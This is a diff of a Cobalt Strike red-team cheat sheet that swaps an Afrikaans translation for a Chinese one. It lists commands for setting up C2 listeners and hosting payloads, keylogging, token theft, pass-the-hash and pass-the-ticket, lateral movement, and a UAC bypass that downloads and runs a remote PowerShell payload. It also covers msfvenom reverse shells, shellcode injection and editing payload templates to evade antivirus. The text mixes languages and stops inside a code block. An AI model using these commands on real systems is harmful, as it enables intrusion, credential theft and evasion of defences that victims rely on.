@@ -1,206 +1,206 @@
 # Cobalt Strike
 
-### Luisteraars
+### Listeners
 
-### C2 Luisteraars
+### C2 Listeners
 
-`Cobalt Strike -> Luisteraars -> Toevoegen/Bewerken` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.
+`Cobalt Strike -> Listeners -> Add/Edit` 然后您可以选择监听的位置、使用的信标类型（http、dns、smb...）等。
 
-### Peer2Peer Luisteraars
+### Peer2Peer Listeners
 
-Die beacons van hierdie luisteraars hoef nie direk met die C2 te praat nie, hulle kan daarmee kommunikeer deur ander beacons.
+这些监听器的信标不需要直接与C2通信，它们可以通过其他信标与其通信。
 
-`Cobalt Strike -> Luisteraars -> Toevoegen/Bewerken` dan moet jy die TCP of SMB beacons kies
+`Cobalt Strike -> Listeners -> Add/Edit` 然后您需要选择TCP或SMB信标
 
-* Die **TCP beacon sal 'n luisteraar op die gekose poort stel**. Om aan te sluit by 'n TCP beacon gebruik die opdrag `connect <ip> <port>` van 'n ander beacon
-* Die **smb beacon sal luister in 'n pypnaam met die gekose naam**. Om aan te sluit by 'n SMB beacon moet jy die opdrag `link [target] [pipe]` gebruik.
+* **TCP信标将在所选端口设置监听器**。要连接到TCP信标，请使用命令 `connect <ip> <port>` 从另一个信标
+* **smb信标将在选定名称的管道中监听**。要连接到SMB信标，您需要使用命令 `link [target] [pipe]`。
 
-### Genereer & Berg payloads op
+### Generate & Host payloads
 
-#### Genereer payloads in lêers
+#### Generate payloads in files
 
-`Aanvalle -> Pakkette ->`&#x20;
+`Attacks -> Packages ->`&#x20;
 
-* **`HTMLApplication`** vir HTA lêers
-* **`MS Office Macro`** vir 'n kantoor dokument met 'n makro
-* **`Windows Uitvoerbare`** vir 'n .exe, .dll of diens .exe
-* **`Windows Uitvoerbare (S)`** vir 'n **stageless** .exe, .dll of diens .exe (beter stageless as staged, minder IoCs)
+* **`HTMLApplication`** 用于HTA文件
+* **`MS Office Macro`** 用于带有宏的办公文档
+* **`Windows Executable`** 用于.exe、.dll或服务.exe
+* **`Windows Executable (S)`** 用于**无阶段**的.exe、.dll或服务.exe（无阶段比有阶段更好，IoCs更少）
 
-#### Genereer & Berg payloads op
+#### Generate & Host payloads
 
-`Aanvalle -> Web Drive-by -> Geskripteerde Web Aflewering (S)` Dit sal 'n skrip/uitvoerbare lêer genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这将生成一个脚本/可执行文件，以从cobalt strike下载信标，格式包括：bitsadmin、exe、powershell和python
 
-#### Berg Payloads op
+#### Host Payloads
 
-As jy reeds die lêer het wat jy wil berg in 'n webbediener, gaan net na `Aanvalle -> Web Drive-by -> Berg Lêer op` en kies die lêer om op te berg en webbediener konfigurasie.
+如果您已经有要在Web服务器上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File` 并选择要托管的文件和Web服务器配置。
 
-### Beacon Opsies
+### Beacon Options
 
-<pre class="language-bash"><code class="lang-bash"># Voer plaaslike .NET binêre uit
+<pre class="language-bash"><code class="lang-bash"># 执行本地 .NET 二进制文件
 execute-assembly &#x3C;/path/to/executable.exe>
 
-# Skermskote
-printscreen    # Neem 'n enkele skermskoot via die PrintScr metode
-screenshot     # Neem 'n enkele skermskoot
-screenwatch    # Neem periodieke skermskote van die skerm
-## Gaan na View -> Skermskote om hulle te sien
+# 截图
+printscreen    # 通过 PrintScr 方法拍摄单个截图
+screenshot     # 拍摄单个截图
+screenwatch    # 定期拍摄桌面截图
+## 转到 View -> Screenshots 查看它们
 
-# sleutellogger
+# 键盘记录器
 keylogger [pid] [x86|x64]
-## View > Keystrokes om die gedrukte sleutels te sien
+## View > Keystrokes 查看按下的键
 
-# poortskandering
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecteer poortskandering aksie binne 'n ander proses
+# 端口扫描
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Importeer Powershell module
+# 导入 Powershell 模块
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;skryf net powershell opdrag hier>
+powershell &#x3C;just write powershell cmd here>
 
-# Gebruiker simulasie
-## Token generasie met geloofsbriewe
-make_token [DOMAIN\user] [password] # Skep 'n token om 'n gebruiker in die netwerk te simuleer
-ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang te verkry tot C$ op 'n rekenaar
-rev2self # Hou op om die token wat gegenereer is met make_token te gebruik
-## Die gebruik van make_token genereer gebeurtenis 4624: 'n Rekening is suksesvol aangemeld. Hierdie gebeurtenis is baie algemeen in 'n Windows domein, maar kan beperk word deur te filtreer op die Aanmeldingstipe. Soos hierbo genoem, gebruik dit LOGON32_LOGON_NEW_CREDENTIALS wat tipe 9 is.
+# 用户冒充
+## 使用凭据生成令牌
+make_token [DOMAIN\user] [password] # 创建令牌以在网络中冒充用户
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用make_token生成的令牌
+## 使用make_token会生成事件4624：账户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，类型为9。
 
-# UAC Bypass
-elevate svc-exe &#x3C;luisteraar>
-elevate uac-token-duplication &#x3C;luisteraar>
+# UAC 绕过
+elevate svc-exe &#x3C;listener>
+elevate uac-token-duplication &#x3C;listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Steel token van pid
-## Soos make_token, maar steel die token van 'n proses
-steal_token [pid] # Dit is ook nuttig vir netwerkaksies, nie plaaslike aksies nie
-## Uit die API-dokumentasie weet ons dat hierdie aanmeldingstipe "die oproeper in staat stel om sy huidige token te kloon". Dit is hoekom die Beacon-uitset sê Impersonated &#x3C;current_username> - dit simuleer ons eie gekloonde token.
-ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang te verkry tot C$ op 'n rekenaar
-rev2self # Hou op om die token van steal_token te gebruik
+## 从pid窃取令牌
+## 类似于make_token，但从进程中窃取令牌
+steal_token [pid] # 此外，这对于网络操作而非本地操作很有用
+## 从API文档中我们知道，这种登录类型“允许调用者克隆其当前令牌”。这就是为什么Beacon输出显示冒充&#x3C;current_username> - 它正在冒充我们自己的克隆令牌。
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用steal_token的令牌
 
-## Lancering van proses met nuwe geloofsbriewe
-spawnas [domain\username] [password] [luisteraar] # Doen dit vanaf 'n gids met leestoegang soos: cd C:\
-## Soos make_token, sal dit Windows-gebeurtenis 4624 genereer: 'n Rekening is suksesvol aangemeld, maar met 'n aanmeldingstipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproepende gebruiker (TargetUserName) en die gesimuleerde gebruiker (TargetOutboundUserName) beskryf.
+## 使用新凭据启动进程
+spawnas [domain\username] [password] [listener] # 从具有读取权限的目录执行，例如：cd C:\
+## 类似于make_token，这将生成Windows事件4624：账户成功登录，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。它将详细说明调用用户（TargetUserName）和冒充用户（TargetOutboundUserName）。
 
-## Injecteer in proses
-inject [pid] [x64|x86] [luisteraar]
-## Vanuit 'n OpSec-oogpunt: Moenie kruisplatform-injectie uitvoer tensy jy regtig moet nie (bv. x86 -> x64 of x64 -> x86).
+## 注入到进程中
+inject [pid] [x64|x86] [listener]
+## 从OpSec的角度来看：除非真的有必要，否则不要执行跨平台注入（例如x86 -> x64或x64 -> x86）。
 
-## Pass die hash
-## Hierdie wysigingsproses vereis patching van LSASS-geheue wat 'n hoë-risiko-aksie is, vereis plaaslike admin-voorregte en is nie altyd lewensvatbaar as Protected Process Light (PPL) geaktiveer is nie.
+## 传递哈希
+## 此修改过程需要对LSASS内存进行修补，这是一个高风险操作，需要本地管理员权限，并且如果启用了受保护进程轻量级（PPL），则不太可行。
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Pass die hash deur mimikatz
+## 通过mimikatz传递哈希
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sonder /run, sal mimikatz 'n cmd.exe spawn, as jy as 'n gebruiker met 'n skerm hardloop, sal hy die skerm sien (as jy as SYSTEM hardloop, is jy reg om te gaan)
-steal_token &#x3C;pid> #Steel token van proses wat deur mimikatz geskep is
+## 如果没有/run，mimikatz会生成cmd.exe，如果您以具有桌面的用户身份运行，他将看到shell（如果您以SYSTEM身份运行，则可以继续）。
+steal_token &#x3C;pid> # 从mimikatz创建的进程中窃取令牌
 
-## Pass die kaartjie
-## Versoek 'n kaartjie
+## 传递票据
+## 请求票据
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## Skep 'n nuwe aanmeldsessie om saam met die nuwe kaartjie te gebruik (om nie die gekompromitteerde een te oorskryf nie)
+## 创建一个新的登录会话以使用新票据（以免覆盖被攻陷的票据）
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Skryf die kaartjie in die aanvaller se masjien vanuit 'n poweshell-sessie &#x26; laai dit
+## 从powershell会话中将票据写入攻击者机器&#x26;加载它
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
-## Pass die kaartjie vanaf SYSTEM
-## Skep 'n nuwe proses met die kaartjie
+## 从SYSTEM传递票据
+## 使用票据生成新进程
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Steel die token van daardie proses
+## 从该进程中窃取令牌
 steal_token &#x3C;pid>
 
-## Haal kaartjie uit + Pass die kaartjie
-### Lys kaartjies
+## 提取票据 + 传递票据
+### 列出票据
 execute-assembly C:\path\Rubeus.exe triage
-### Dump interessante kaartjie deur luid
+### 通过luid转储有趣的票据
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Skep 'n nuwe aanmeldsessie, neem luid en proses-ID op
-execute-assembly C:\pad\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Voeg kaartjie in in gegenereerde aanmeldsessie
-execute-assembly C:\pad\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-kaartjie...]
-### Steel uiteindelik die token van daardie nuwe proses
+### 创建新的登录会话，注意luid和processid
+execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+### 在生成的登录会话中插入票据
+execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+### 最后，从该新进程中窃取令牌
 steal_token &#x3C;pid>
 
-# Laterale beweging
-## As 'n token geskep is, sal dit gebruik word
-jump [metode] [teiken] [luisteraar]
-## Metodes:
-## psexec                    x86   Gebruik 'n diens om 'n Service EXE-artefak uit te voer
-## psexec64                  x64   Gebruik 'n diens om 'n Service EXE-artefak uit te voer
-## psexec_psh                x86   Gebruik 'n diens om 'n PowerShell-eenreëliner uit te voer
-## winrm                     x86   Voer 'n PowerShell-skripsie uit via WinRM
-## winrm64                   x64   Voer 'n PowerShell-skripsie uit via WinRM
+# 横向移动
+## 如果创建了令牌，将会使用它
+jump [method] [target] [listener]
+## 方法：
+## psexec                    x86   使用服务运行服务EXE工件
+## psexec64                  x64   使用服务运行服务EXE工件
+## psexec_psh                x86   使用服务运行PowerShell一行代码
+## winrm                     x86   通过WinRM运行PowerShell脚本
+## winrm64                   x64   通过WinRM运行PowerShell脚本
 
-remote-exec [metode] [teiken] [opdrag]
-## Metodes:
-<strong>## psexec                          Voer op afstand uit via die Diensbeheerder
-</strong>## winrm                           Voer op afstand uit via WinRM (PowerShell)
-## wmi                             Voer op afstand uit via WMI
+remote-exec [method] [target] [command]
+## 方法：
+<strong>## psexec                          通过服务控制管理器远程执行
+</strong>## winrm                           通过WinRM（PowerShell）远程执行
+## wmi                             通过WMI远程执行
 
-## Om 'n beacon met wmi uit te voer (dit is nie in die jump-opdrag nie) laai net die beacon op en voer dit uit
+## 要使用wmi执行信标（它不在jump命令中），只需上传信标并执行
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
-# Gee sessie aan Metasploit - Deur middel van 'n luisteraar
-## Op Metasploit-gashuis
+# 通过监听器将会话传递给Metasploit
+## 在metaploit主机上
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## Op cobalt: Luisteraars > Voeg by en stel die Payload in op Foreign HTTP. Stel die Host in op 10.10.5.120, die Poort op 8080 en klik op Stoor.
+## 在cobalt上：Listeners > Add并将Payload设置为Foreign HTTP。将Host设置为10.10.5.120，将Port设置为8080，然后单击保存。
 beacon> spawn metasploit
-## Jy kan slegs x86 Meterpreter-sessies spawn met die vreemde luisteraar.
+## 您只能使用外部监听器生成x86 Meterpreter会话。
 
-# Gee sessie aan Metasploit - Deur middel van shellcode-injeksie
-## Op Metasploit-gashuis
+# 通过shellcode注入将会话传递给Metasploit
+## 在metasploit主机上
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Voer msfvenom uit en berei die multi/handler-luisteraar voor
+## 运行msfvenom并准备multi/handler监听器
 
-## Kopieer binêre lêer na cobalt strike-gashuis
+## 将bin文件复制到cobalt strike主机
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injecteer Metasploit shellcode in 'n x64-proses
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin # 在x64进程中注入metasploit shellcode
 
-# Gee Metasploit-sessie aan cobalt strike
-## Genereer stageless Beacon shellcode, gaan na Aanvalle > Pakkette > Windows Uitvoerbare lêer (S), kies die gewenste luisteraar, kies Raw as die Uitvoertipe en kies Gebruik x64-payload.
-## Gebruik post/windows/manage/shellcode_inject in Metasploit om die gegenereerde cobalt strike shellcode in te spuit
+# 将metasploit会话传递给cobalt strike
+## 生成无阶段的Beacon shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型，并选择使用x64有效负载。
+## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode
 
 
-# Pivoting
-## Maak 'n sokkiesproksi oop in die spanbediener
+# 代理
+## 在teamserver中打开socks代理
 beacon> socks 1080
 
-# SSH-verbinding
-beacon> ssh 10.10.17.12:22 gebruikersnaam wagwoord</code></pre>
+# SSH连接
+beacon> ssh 10.10.17.12:22 username password</code></pre>
 
-## Vermy AV's
+## 避免AVs
 
-### Artefaktkit
+### Artifact Kit
 
-Gewoonlik in `/opt/cobaltstrike/artifact-kit` kan jy die kode en vooraf saamgestelde sjablone (in `/src-common`) van die payloads vind wat cobalt strike gaan gebruik om die binêre beacons te genereer.
+通常在`/opt/cobaltstrike/artifact-kit`中，您可以找到cobalt strike将用于生成二进制信标的代码和预编译模板（在`/src-common`中）。
 
-Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) te gebruik met die gegenereerde agterdeur (of net met die saamgestelde sjabloon) kan jy vind wat verdediger aktiveer. Dit is gewoonlik 'n string. Jy kan dus net die kode wat die agterdeur genereer wysig sodat daardie string nie in die finale binêre lêer verskyn nie.
+使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)与生成的后门（或仅使用编译的模板），您可以找到触发防御者的原因。通常是一个字符串。因此，您可以修改生成后门的代码，以便该字符串不会出现在最终的二进制文件中。
 
-Nadat jy die kode gewysig het, voer jy net `./build.sh` uit vanuit dieselfde gids en kopieer die `dist-pipe/`-gids na die Windows-kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
+修改代码后，只需从同一目录运行`./build.sh`，并将`dist-pipe/`文件夹复制到Windows客户端的`C:\Tools\cobaltstrike\ArtifactKit`中。
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
-Moenie vergeet om die aggressiewe skrip `dist-pipe\artifact.cna` te laai om aan te dui dat Cobalt Strike die hulpbronne vanaf die skyf moet gebruik wat ons wil hê en nie die een wat gelaai is nie.
+不要忘记加载激进脚本 `dist-pipe\artifact.cna` 以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。
 
-### Hulpbronpakket
+### 资源包
 
-Die Hulpbronpakket-vouer bevat die sjablone vir Cobalt Strike se skripsgebaseerde vragte, insluitend PowerShell, VBA en HTA.
+ResourceKit 文件夹包含 Cobalt Strike 基于脚本的有效载荷模板，包括 PowerShell、VBA 和 HTA。
 
-Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die sjablone te gebruik, kan jy vind wat die verdediger (AMSI in hierdie geval) nie wil hê nie en dit wysig:
+使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 和模板，您可以找到防御者（在这种情况下是 AMSI）不喜欢的内容并进行修改：
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
-### Verander die opgespoorde lyne sodat jy 'n sjabloon kan genereer wat nie opgemerk sal word nie.
+修改检测到的行可以生成一个不会被捕获的模板。
 
-Moenie vergeet om die aggressiewe skrip `ResourceKit\resources.cna` te laai om aan te dui dat Cobalt Strike die hulpbronne vanaf die skyf moet gebruik wat ons wil hê en nie die een wat gelaai is nie.
+不要忘记加载激进脚本 `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
